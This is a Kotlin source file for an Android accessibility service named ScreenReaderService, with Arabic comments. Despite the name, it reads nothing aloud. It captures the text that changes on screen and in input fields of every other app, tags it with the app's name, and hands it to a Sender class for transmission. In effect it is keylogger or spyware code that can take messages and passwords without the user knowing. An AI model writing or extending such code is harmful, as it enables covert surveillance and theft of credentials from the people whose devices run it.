package com.sync.app

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent

class ScreenReaderService : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // نراقب فقط أحداث النصوص المهمة
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {

                val pkg = event.packageName?.toString() ?: return

                // تجاهل تطبيقنا
                if (pkg == packageName) return

                // تجاهل النظام
                if (pkg == "android" || pkg.startsWith("com.android.systemui")) return

                val text = event.text?.joinToString(" ") ?: return

                if (text.isBlank()) return

                val appName = try {
                    val pm = packageManager
                    val info = pm.getApplicationInfo(pkg, 0)
                    pm.getApplicationLabel(info).toString()
                } catch (e: Exception) {
                    pkg
                }

                // نرسل فقط إذا في نص حقيقي
                if (text.length > 2) {
                    Sender.send(this, "[Screen - $appName]", text)
                }
            }
        }
    }

    override fun onInterrupt() {
        // لا شي
    }
}
